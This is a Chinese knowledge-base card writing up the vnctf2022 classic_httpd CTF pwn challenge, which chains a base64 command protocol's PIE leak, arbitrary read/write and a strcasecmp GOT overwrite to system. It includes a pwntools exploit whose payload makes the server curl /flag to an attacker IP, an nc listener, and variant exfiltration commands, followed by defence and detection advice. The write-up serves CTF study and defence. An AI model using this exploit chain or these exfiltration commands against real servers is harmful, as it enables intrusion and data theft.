---
id: ctf-pwn-httpd-base64-typed-command-arb-rw-got-system
title: vnctf2022 classic_httpd：base64 类型化命令协议暴露任意读/写，泄 PIE/libc 后改 GOT 为 system 执行命令
type: scenario
domain: ctf
path: ctf/pwn
technique: httpd-base64-typed-command-arbitrary-rw-got-hijack
tags:
- ctf
- pwn
- http-server
- base64
- custom-protocol
- arbitrary-read
- arbitrary-write
- got-hijack
- system
- command-execution
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V292
  verified_at: '2026-11-08T08:26:23+08:00'
  notes: 已对照全文与图 03/04 核对：请求行路径经 my_recv 循环（需 \n 结束）、文件不存在进入 sub_1DBE 命令分支、accept 阻塞并 pthread_create 每连接一线程，与卡内服务模型一致；type 0xf1 任意写(chance<=2)、0x88 任意读(chance<=1)、0x66 泄 PIE(addr1<=4, chance=0)、0x22 以 ping 为 addr1 且 strlen(addr2)<=0xf 打印，与原文结构体说明及 exp 的 p32(1)/p32(2) 命令计数一致；exp 的 codebase-0x4070、读 codebase+0x60c0 得 libc、system=libc+0x55410、写 codebase+0x6048(strcasecmp@GOT)、0x22 触发 curl 外带均与原文一致。原子性=自实现 httpd 类型化命令协议的任意读写+GOT 劫持，单原子；与同题非预期目录穿越卡为不同缺陷，已互链。原文未标版本，不设 affected_versions。未在题目环境复跑。
url: /docs/ctf/pwn/ctf-pwn-httpd-base64-typed-command-arb-rw-got-system/
draft: false
kb_aliases:
- vnctf2022 classic_httpd
- classic_httpd
- 自定义 httpd 任意读写
- 0xf1 任意写
- 0x66 泄 PIE
- 0x88 任意读
- submit.cgi 命令协议
---

## 一句话结论

vnctf2022 `classic_httpd` 是一个自实现的小型 HTTP 服务：请求 `submit.cgi` 分支会把 query 里 base64 编码的数据解码成 `{type, addr1, addr2, addr3}` 命令数组，其中 `0x66` 泄 PIE、`0x88` 任意读、`0xf1` 任意写（仅限次数）；先用 `0x66` 拿到 codebase，用 `0x88` 读 GOT 拿 libc，再用 `0xf1` 把 `system` 写到 `codebase+0x6048` 的 GOT，最后用 `0x22` 分支让服务端对攻击者提供的 `curl` 命令调用被劫持函数，把 `/flag` 外带。

## 原理

- **服务模型**：程序 `bind/listen` 后循环 `accept()`，每个连接 `pthread_create` 起线程处理；请求行被解析后，若目标文件存在就走正常文件服务分支，否则（或请求 `submit.cgi` 时）进入 `sub_1DBE` 一类的命令解析分支。`accept()` 是阻塞的，所以一次只能处理一个新连接，文章中的 exp 因此分多次 `remote` 连接完成泄漏、写入和触发。
- **base64 只是编码**：`sub_1DBE` 把请求 query 中的 base64 解成一段二进制命令缓冲区，按结构体数组解析。文章逆出的命令结构包含 `type` 与 `addr1/addr2/addr3` 三个 64 位地址字段；`type` 决定执行哪个分支。
- **类型化读写原语**：
  - `type=0xf1`：执行 `*(addr1+addr2) = *addr3`，即把 `addr3` 地址处的值写到 `addr1+addr2`，文章称可用次数不超过 2 次，是任意写原语。
  - `type=0x88`：打印 `*(addr1+addr2)`，即任意地址读，文章称可用 1 次。
  - `type=0x66`：用于泄露 PIE；exp 传入 `addr1=4`，服务端回显一个 14 位十六进制指针，减去固定偏移 `0x4070` 得到 ELF 基址。
  - `type=0x22`：要求 `addr1='ping'`、`strlen(addr2)<=0xf`，并把 `addr2` 处的字符串按 `%s` 输出；该分支是后续劫持 GOT 后的调用触发点。
  - `type=0x12`：文章标注为未使用。
- **为什么能拿 libc**：`0x88` 读取 `codebase+0x60c0` 处的 GOT 项（exp 用 `p64(codebase)+p64(0x60c0)`），服务端把该地址的 8 字节内容打印出来；减去题目 libc 中对应符号的偏移 `0x1232c0` 得到 libc 基址，`system = libc_base + 0x55410`。
- **为什么能改 GOT**：`0xf1` 的写入目标完全由攻击者给的两个 64 位字段相加决定，没有任何范围/可写性检查；程序的 GOT 可写（非 Full RELRO），所以把 `system` 写到 `codebase+0x6048` 的 GOT 槽即可。文章把该槽标注为 `strcasecmp@GOT`；具体是哪个导入函数以题目二进制为准，关键是该槽对应的函数会在 `0x22` 分支中以攻击者可控的字符串为参数被调用，从而变成 `system(addr2)`。
- **为什么能执行命令**：`0x22` 分支原本只是“打印字符串”，但函数调用经过被改写的 GOT 后就变成 `system(字符串)`；exp 把 `addr2` 设为 `curl -X POST -F "flag=@/flag" <attacker>`，目标主动把 `/flag` 作为 multipart 文件外带到攻击者监听端口，绕开“服务端没有回显命令输出”的限制。
- **与非预期解的区别**：同一服务还存在请求路径未过滤 `../` 的目录穿越（`POST /../flag` 直接读根目录 flag），那是独立的文件处理缺陷，见关联卡；本卡走的是命令协议的内存读写链。

## 触发条件

- 目标为自实现/极简 HTTP 服务，存在把请求参数解码为“类型 + 地址”命令数组的解释器分支（如 `submit.cgi` / 文件不存在分支）。
- `0x66`、`0x88`、`0xf1` 等分支没有对地址范围、目标内存属性、调用次数做严格限制（文章的次数限制仍够完成一次泄漏 + 一次读 + 一次写）。
- GOT 可写（Partial RELRO 或未启用 Full RELRO）；存在一个会在 `0x22` 分支被调用的导入函数，且其参数可由攻击者控制。
- 已知题目 libc（或能通过 `0x88` 泄露出 libc 符号）与 PIE 偏移；目标可发起出站连接（用于 `curl` 外带）或可写 web 目录（用于把 flag 搬到可访问路径）。
- 每个请求需要一个独立连接，因为 `accept()` 阻塞；exp 需按阶段重连。

## 利用步骤

1. 连接目标端口，构造 `GET /submit.cgi?<base64(command_blob)> \n\n`（exp 用 GET；文章叙述里也称 POST，实际以题目解析为准）。请求行末尾的空格和两个换行用于让服务端的读循环结束。
2. 泄 PIE：命令为 `p32(1) + p32(0x66) + p64(4) + p64(0) + p64(0)`；解析服务端回显的 `Let us look. Oh! That is <hex>`，取前 14 个十六进制字符，减 `0x4070` 得 `codebase`。
3. 泄 libc：命令为 `p32(1) + p32(0x88) + p64(codebase) + p64(0x60c0) + p64(0)`；解析 `OK! I give you some message!` 后的 8 字节指针，减 `0x1232c0` 得 `libc_base`，`system = libc_base + 0x55410`。
4. 写 GOT + 触发：命令块为 `p32(2)` + `p32(0xf1) + p64(codebase) + p64(0x6048) + p64(system)` + `p32(0x22) + b"ping".ljust(8,b"\x00") + b'curl -X POST -F "flag=@/flag" <attacker_ip>:<port>'`；第一条命令把 GOT 改成 `system`，第二条命令进入 `0x22` 分支，使服务端执行 `curl`。
5. 在攻击者主机监听端口，接收 multipart 请求中的 `/flag`；每次 `io.close()` 后重连进行下一阶段（文章 exp 分三次连接）。
6. 若出站被限制，把 `addr2` 换成把 flag 复制到 web 根的命令（如 `cp /flag htdocs/flag`），再用普通 GET 读取；命令长度受 `0x22` 的长度检查约束时，可先写更长的命令到可写内存再用指针引用。

## PoC

最小骨架（偏移按题目 libc/二进制调整；`cmd()` 负责 base64 与请求行）：

```python
from pwn import *
import base64

context(os='linux', arch='amd64', log_level='info')
HOST, PORT = 'target', 26097

def cmd(data):
    b64 = base64.b64encode(data).decode()
    return f"GET /submit.cgi?{b64} \n\n".encode()

# 1) 泄 PIE
io = remote(HOST, PORT)
io.send(cmd(p32(1) + p32(0x66) + p64(4) + p64(0) + p64(0)))
io.recvuntil(b"Let us look. Oh! That is ")
codebase = int(io.recvline()[:14], 16) - 0x4070
io.close()

# 2) 泄 libc
io = remote(HOST, PORT)
io.send(cmd(p32(1) + p32(0x88) + p64(codebase) + p64(0x60c0) + p64(0)))
io.recvuntil(b"OK! I give you some message!\n")
libc_base = int(io.recvline()[-15:-1], 16) - 0x1232c0
system = libc_base + 0x55410
io.close()

# 3) 改 GOT 并借 0x22 分支执行命令
payload  = p32(2)
payload += p32(0xf1) + p64(codebase) + p64(0x6048) + p64(system)
payload += p32(0x22) + b"ping".ljust(8, b"\x00")
payload += b'curl -X POST -F "flag=@/flag" 172.18.211.41:4444'
io = remote(HOST, PORT)
io.send(cmd(payload))
io.close()
```

```bash
# 攻击者侧
nc -lvnp 4444
```

## 变体与关联

- **触发点变体**：`0x22` 只是文章选择的“打印字符串”分支；任何会在 GOT 改写后被调用、且参数可控的分支都可作为触发点。被改写的也可以不是 `strcasecmp`，而是 `printf`、`atoi`、`free` 等实际被调用的导入函数。
- **无出站变体**：`system` 命令改为把 `/flag` 复制到 web 根、写入可访问日志/临时文件，或反弹 shell；若目标有 DNS，可用 `curl http://<attacker>/?x=$(cat /flag)`。
- **写原语变体**：若 `0xf1` 次数不足以改 GOT，可先写 `__free_hook`/`__malloc_hook`（glibc < 2.34）或栈返回地址；若 `0x88` 只能读一次，优先读 GOT 拿 libc，PIE 用 `0x66` 单独拿。
- **防护变体**：Full RELRO 下 GOT 只读，需要转向 libc 钩子、`_IO` 结构或栈；若服务端对 `type` 做白名单，需要先找类型混淆/越界写绕过。
- **关联**：[[ctf-pwn-custom-vm-opcode-native-memory-got-restart-onegadget]]（自定义 VM 内存读写改 GOT）、[[ctf-pwn-bytecode-vm-signed-offset-oob-write-global-command-system]]（字节码 VM 越界写命令缓冲区）、[[ctf-pwn-negative-index-note-array-copy-reloc-leak-got-system]]（GOT 改 system 的另一种入口）、[[ctf-pwn-httpd-path-popen-command-injection]]（同为自实现 httpd，但 sink 是 `popen` 命令注入）。
- **非预期解**：同一题的请求路径不校验 `../`，`POST /../flag` 可直接读 flag（见关联的目录穿越卡）。

## 检测与防御

- **设计层**：不要向不受信输入暴露通用的“地址 + 值”读写命令；命令类型必须白名单，地址必须落在预分配的缓冲区/结构体内，读写长度和次数要受限。
- **二进制加固**：启用 PIE + Full RELRO + 栈保护；把敏感导入函数放到只读的 GOT（Full RELRO）；使用 `-fstack-protector-strong` 与 CET。
- **运行层**：以最小权限运行，禁用不必要的出站网络；对 `system`/`popen` 调用做审计；对 `submit.cgi` 这类调试/管理分支在生产环境直接关闭。
- **检测**：请求 query 是 base64 且解码后出现 `0x66`/`0x88`/`0xf1`/`0x22` 等类型字与连续 64 位地址；短时间多次连接 `submit.cgi`；进程产生 `curl`/`wget` 等出站子进程；GOT 页出现写操作（如启用 mprotect 监控）。
